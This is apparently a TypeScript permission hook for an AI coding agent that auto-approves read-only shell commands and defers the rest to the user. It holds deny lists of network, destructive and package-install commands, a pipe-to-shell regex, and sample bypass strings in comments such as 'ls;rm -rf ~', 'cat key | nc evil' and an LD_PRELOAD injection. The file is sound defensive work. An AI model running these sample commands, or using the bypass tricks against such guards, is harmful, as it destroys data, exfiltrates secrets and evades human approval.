/**
 * Auto-Approve Safe Bash Commands
 *
 * TypeScript port of scripts/permission/auto-approve-safe-bash.sh
 *
 * Auto-approves read-only commands that don't modify system state:
 * - File listing: ls, find, tree, du, df
 * - File reading: cat, head, tail, less, more, bat
 * - Search: grep, rg, ag, ack, fd
 * - Git info: git status, git log, git diff, git branch
 * - System info: pwd, whoami, which, type, echo
 * - Package info: npm list, pip list, pip show
 *
 * Requires approval for:
 * - Git writes: git commit, git push, git checkout, git merge
 * - Package installs: npm install, pip install, brew install
 * - File operations: rm, mv, cp, mkdir, touch, chmod
 * - Network: curl, wget, ssh, scp
 * - Any command with redirect operators (>, >>)
 *
 * @module permission/auto-approve-safe-bash
 */

import { guardBash, guardHasCommand, runGuards } from '../lib/guards.js';
import { getCommand, getSessionId, stripProxyPrefix } from '../lib/input.js';
import { logDebug, logInfo, logPermission } from '../lib/logging.js';
import { outputAllow, outputSilentSuccess } from '../lib/output.js';
import type { HookInput, HookResult } from '../types.js';

const HOOK_NAME = 'auto-approve-safe-bash';

// =============================================================================
// SAFE COMMAND PATTERNS (read-only operations)
// =============================================================================

/**
 * Commands that are always safe (no arguments needed).
 * These are exact matches only.
 */
const SAFE_COMMANDS_EXACT: ReadonlyArray<string> = [
  'pwd',
  'whoami',
  'id',
  'date',
  'uptime',
  'hostname',
];

/**
 * Command prefixes that are safe (with any arguments).
 * These match commands that start with or contain these prefixes.
 */
const SAFE_COMMAND_PREFIXES: ReadonlyArray<string> = [
  // File listing
  'ls',
  'tree',
  'find ', // Note: space after to avoid matching 'findutils'
  'fd ',
  'du ',
  'df ',
  'stat ',
  'file ',
  'wc ',

  // File reading (non-destructive)
  'cat ',
  'head ',
  'tail ',
  'less ',
  'more ',
  'bat ',

  // Search tools
  'grep ',
  'rg ',
  'ag ',
  'ack ',
  'ripgrep ',

  // Git read-only operations
  'git status',
  'git log',
  'git diff',
  'git show',
  'git branch',
  'git remote -v',
  'git remote show',
  'git tag',
  'git describe',
  'git rev-parse',
  'git config --get',
  'git config --list',
  'git ls-files',
  'git ls-tree',
  'git cat-file',
  'git name-rev',
  'git shortlog',
  'git blame',
  'git stash list',

  // System info
  'which ',
  'type ',
  'command -v',
  'echo ',
  'printf ',

  // Package managers (list/show only)
  'npm list',
  'npm ls',
  'npm view',
  'npm info',
  'npm show',
  'npm outdated',
  'npm audit', // Read-only audit
  'pip list',
  'pip show',
  'pip freeze',
  'pip check',
  'poetry show',
  'uv pip list',
  'uv pip show',

  // Build tools (read-only)
  'mise tasks',
  'mise list',
  'mise current',
  'mise ls',

  // Node/Python info
  'node --version',
  'node -v',
  'npm --version',
  'npm -v',
  'python --version',
  'python -V',
  'python3 --version',
  'python3 -V',
  'pip --version',
  'pip -V',

  // Process info
  'ps ',
  'pgrep ',
  'lsof ',
  'top -l 1', // One snapshot only

  // Text processing (read-only)
  'fmt ',
  'comm ',
  'cmp ',
  'numfmt ',
  'expr ',
  'test ',
  'seq ',
  'tsort ',
  'pr ',
  'getconf ',

  // Terminal info
  'tput ',
  'ss ',

  // File finding (alternative names)
  'fdfind ',

  // Help commands. Bare `--help` / `-h` were REMOVED: getSafePrefix matched
  // them anywhere, so `evilcmd -h` auto-approved an arbitrary binary (help-flag
  // safety depends on the binary being trusted, not on the flag). `man ` stays.
  'man ',

  // Directory change — harmless alone; needed so a compound like `cd X && ls`
  // passes per-segment safety (the `cd X` segment must itself be safe).
  'cd ',
];

// =============================================================================
// DANGEROUS PATTERNS (always require approval)
// =============================================================================

/**
 * Patterns that always require approval regardless of command.
 * These are checked using regex matching.
 */
const DANGEROUS_PATTERNS: ReadonlyArray<RegExp> = [
  // Redirects (could overwrite files)
  />/,
  />>/,

  // Pipes to dangerous commands
  /\| *rm/,
  /\| *dd/,
  /\| *mv/,

  // Subshells with dangerous potential
  /\$\(/,
  /`/,

  // Process substitution `<(cmd)` runs cmd as a side effect — not caught by
  // segment splitting (it lives inside one segment), so block it here.
  /<\(/,

  // Pipe into a shell/interpreter — `curl x | sh`, `cat y | bash`, `| python`
  /\|\s*(?:sh|bash|zsh|dash|ksh|python3?|perl|ruby|node)\b/,

  // Backgrounding (could hide operations)
  /&$/,
  /& *$/,
];

/**
 * Commands that always require approval.
 * These are prefix matches.
 */
const REQUIRE_APPROVAL_PREFIXES: ReadonlyArray<string> = [
  // File modifications
  'rm ',
  'mv ',
  'cp ',
  'mkdir ',
  'rmdir ',
  'touch ',
  'chmod ',
  'chown ',
  'ln ',

  // Git write operations
  'git add',
  'git commit',
  'git push',
  'git pull',
  'git fetch',
  'git checkout',
  'git merge',
  'git rebase',
  'git reset',
  'git revert',
  'git cherry-pick',
  'git stash',
  'git clean',
  'git restore',
  'git switch',

  // Package installs
  'npm install',
  'npm i ',
  'npm ci',
  'npm uninstall',
  'npm update',
  'npm upgrade',
  'npm link',
  'npm publish',
  'pip install',
  'pip uninstall',
  'pip download',
  'poetry install',
  'poetry add',
  'poetry remove',
  'uv pip install',
  'uv pip uninstall',
  'brew install',
  'brew uninstall',
  'brew upgrade',
  'apt install',
  'apt remove',
  'apt update',
  'apt upgrade',

  // Network operations
  'curl ',
  'wget ',
  'ssh ',
  'scp ',
  'rsync ',
  'sftp ',

  // Dangerous system commands
  'sudo ',
  'su ',
  'dd ',
  'mkfs',
  'fdisk',
  'format',

  // Process control
  'kill ',
  'killall ',
  'pkill ',

  // Docker operations
  'docker run',
  'docker exec',
  'docker rm',
  'docker rmi',
  'docker stop',
  'docker kill',
  'docker compose',
];

// =============================================================================
// EVALUATION FUNCTIONS
// =============================================================================

/**
 * Check if command contains any dangerous patterns.
 *
 * @param command - The bash command to check
 * @returns True if the command contains a dangerous pattern
 */
export function containsDangerousPattern(command: string): boolean {
  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(command)) {
      return true;
    }
  }
  return false;
}

/**
 * Check if a command segment begins with one or more bare environment
 * variable assignments followed by another command (e.g. `PATH=/tmp ls`,
 * `LD_PRELOAD=/tmp/evil.so cat foo`, `FOO=bar grep secret file`).
 *
 * Mirrors CC v2.1.145's fix: bare variable assignments preceding a command
 * can change binary lookup (PATH), inject shared libraries (LD_PRELOAD,
 * DYLD_INSERT_LIBRARIES, LD_LIBRARY_PATH), or alter parser behavior (IFS).
 * Auto-approving the trailing command because it matches a safe prefix
 * lets an attacker smuggle these env-var-based vectors past the allowlist.
 *
 * Inspects each segment separated by compound operators (`&&`, `||`, `;`,
 * `|`) so that `cd /path && PATH=/tmp ls` is caught in the second segment.
 *
 * Bare assignments with no trailing command (`FOO=bar`) are NOT flagged —
 * they don't match a safe prefix anyway, so they already defer to the
 * standard permission flow.
 *
 * @param command - The bash command to check
 * @returns True if any segment is an env-var assignment + command
 */
export function hasEnvVarAssignment(command: string): boolean {
  // Split on shell compound separators. Keep regex simple — we don't need
  // full shell parsing, just to catch the common compound forms.
  const segments = command.split(/\s*(?:&&|\|\||;|\|)\s*/);
  for (const segment of segments) {
    const trimmed = segment.trim();
    // POSIX env-var name: starts with letter/underscore, then word chars.
    // Match VAR=value (possibly empty value) followed by space + a command.
    if (/^[A-Za-z_][A-Za-z0-9_]*=\S*\s+\S/.test(trimmed)) {
      return true;
    }
  }
  return false;
}

/**
 * Check if a `find` invocation includes an action flag that mutates the
 * filesystem. CC v2.1.113 stopped auto-approving `Bash(find:*)` when
 * `-exec` / `-execdir` / `-delete` is present. We must mirror this — a
 * plain find is read-only, but find with these action flags is a write.
 *
 * @param command - The bash command to check
 * @returns True if command contains find with -exec/-execdir/-delete
 */
export function findHasUnsafeAction(command: string): boolean {
  // Any occurrence of `find` (as a word) followed somewhere by -exec / -execdir / -delete.
  // Catches compound commands too: "cd /tmp && find . -name X -exec rm {} \;"
  if (!/\bfind\b/.test(command)) return false;
  return /\s-exec(?:dir)?\b|\s-delete\b/.test(command);
}

/**
 * Check if command starts with require-approval prefix.
 * Also checks if the prefix appears after a space (for compound commands).
 *
 * @param command - The bash command to check
 * @returns True if the command requires approval
 */
export function requiresApproval(command: string): boolean {
  for (const prefix of REQUIRE_APPROVAL_PREFIXES) {
    // Check if command starts with the prefix
    if (command.startsWith(prefix)) {
      return true;
    }
    // Check if prefix appears after a space (e.g., "cd /path && rm file")
    if (command.includes(` ${prefix}`)) {
      return true;
    }
  }
  return false;
}

/**
 * Check if command is an exact safe command.
 *
 * @param command - The bash command to check
 * @returns True if the command exactly matches a safe command
 */
export function isExactSafeCommand(command: string): boolean {
  return SAFE_COMMANDS_EXACT.includes(command);
}

/**
 * Check if command starts with a safe prefix.
 * Also checks if the prefix appears after a space (for compound commands).
 *
 * @param command - The bash command to check
 * @returns The matching safe prefix or null if no match
 */
export function getSafePrefix(command: string): string | null {
  for (const prefix of SAFE_COMMAND_PREFIXES) {
    // Check if command starts with the prefix
    if (command.startsWith(prefix)) {
      return prefix;
    }
    // Check if prefix appears after a space (e.g., "cd /path && ls -la")
    if (command.includes(` ${prefix}`)) {
      return prefix;
    }
  }
  return null;
}

/**
 * Check if command starts with a safe prefix (boolean version).
 *
 * @param command - The bash command to check
 * @returns True if the command matches a safe prefix
 */
export function hasSafePrefix(command: string): boolean {
  return getSafePrefix(command) !== null;
}

/**
 * Split a command into individual segments on shell control operators
 * (`&&`, `||`, `;`, `|`, `&`, newline). Auto-approval must hold for EVERY
 * segment, not just the one the command starts with — otherwise a command that
 * merely STARTS safe can smuggle a dangerous one after a separator
 * (`ls;rm -rf ~`, `echo go\ngit push --force main`, `cat key | nc evil`).
 *
 * Note: this is intentionally conservative, not a full shell parser — a
 * separator inside quotes (`grep "a|b" f`) splits too and simply defers to a
 * prompt. Over-deferring is safe; over-approving is the bug we are closing.
 */
export function splitIntoSegments(command: string): string[] {
  return command
    .split(/\s*(?:&&|\|\||;|\||&|\n|\r)\s*/)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/**
 * Check whether a SINGLE command segment is safe on its own — it exactly
 * matches a safe command or STARTS WITH a safe prefix. Anchored to the start of
 * the segment (unlike getSafePrefix's legacy includes() match), so a help flag
 * or safe word appearing later (`evilcmd -h`) does not make it safe.
 *
 * @param segment - One command segment (already split on separators)
 * @returns True if the segment is independently safe
 */
export function isSegmentSafe(segment: string): boolean {
  const trimmed = segment.trim();
  if (isExactSafeCommand(trimmed)) return true;
  return SAFE_COMMAND_PREFIXES.some((prefix) => trimmed.startsWith(prefix));
}

// =============================================================================
// MAIN HOOK FUNCTION
// =============================================================================

/**
 * Auto-approve safe bash commands.
 *
 * This hook evaluates Bash commands and auto-approves read-only operations
 * that don't modify system state. Commands that could be dangerous or modify
 * files are deferred to the standard permission flow.
 *
 * @param input - Hook input from Claude Code
 * @returns Hook result (allow, deny, or silent success)
 *
 * @example
 * ```typescript
 * const result = await autoApproveSafeBash({
 *   tool_name: 'Bash',
 *   tool_input: { command: 'git status' }
 * });
 * // result.hookSpecificOutput.permissionDecision === 'allow'
 * ```
 */
export async function autoApproveSafeBash(input: HookInput): Promise<HookResult> {
  const skipped = runGuards(input, guardBash, guardHasCommand);
  if (skipped) return skipped;

  // guardHasCommand ensures command is present; narrow for TypeScript
  const command = getCommand(input) as string;

  logDebug(HOOK_NAME, `Evaluating: ${command.slice(0, 80)}...`);

  // Check dangerous patterns first
  if (containsDangerousPattern(command)) {
    logDebug(HOOK_NAME, 'Requires approval: contains dangerous pattern');
    return outputSilentSuccess();
  }

  // CC v2.1.113: find with -exec / -execdir / -delete is no longer auto-approved.
  // These flags turn a read-only find into a write operation.
  if (findHasUnsafeAction(command)) {
    logDebug(HOOK_NAME, 'Requires approval: find with -exec/-delete (CC v2.1.113)');
    return outputSilentSuccess();
  }

  // CC v2.1.145 analog: bare VAR=value assignments before a command (PATH=,
  // LD_PRELOAD=, IFS=, etc.) bypass the safe-prefix allowlist by altering
  // binary lookup, lib injection, or parser behavior. Defer to standard
  // permission flow so the user sees the assignment before approving.
  if (hasEnvVarAssignment(command)) {
    logDebug(HOOK_NAME, 'Requires approval: env-var assignment prefix (CC v2.1.145 analog)');
    return outputSilentSuccess();
  }

  // Per-segment safety: split on shell separators and require EVERY segment to
  // be independently safe. This is the bypass-resistant core — a command that
  // merely STARTS safe (`ls`, `echo go`, `cat foo`) no longer auto-approves a
  // dangerous command chained after `;`, a newline, a tab, or `|`. A genuinely
  // safe pipe (`cat foo | grep bar`) still passes because both segments match.
  const segments = splitIntoSegments(command);
  if (segments.length === 0) {
    logDebug(HOOK_NAME, 'No parseable segment, deferring to standard flow');
    return outputSilentSuccess();
  }

  for (const rawSegment of segments) {
    // Unwrap a token-optimizing proxy prefix (`rtk git status` → `git status`)
    // so the allowlist keeps matching when a proxy like rtk is active. Mirrors
    // security-blocker, which already strips before its own matching. Stripping
    // also hardens approval: `rtk rm -rf ~` unwraps to `rm -rf ~` and is caught
    // by requiresApproval for the right reason, not merely as an unknown prefix.
    const segment = stripProxyPrefix(rawSegment);
    if (requiresApproval(segment)) {
      logDebug(HOOK_NAME, `Requires approval: segment '${segment.slice(0, 60)}'`);
      return outputSilentSuccess();
    }
    if (!isSegmentSafe(segment)) {
      logDebug(HOOK_NAME, `Segment not on safe allowlist: '${segment.slice(0, 60)}'`);
      return outputSilentSuccess();
    }
  }

  const sessionId = getSessionId(input);
  logInfo(HOOK_NAME, `Auto-approved: all ${segments.length} segment(s) safe`);
  logPermission('allow', `auto-approved safe command: ${command.slice(0, 80)}`, 'Bash', sessionId);
  return outputAllow();
}

export default autoApproveSafeBash;
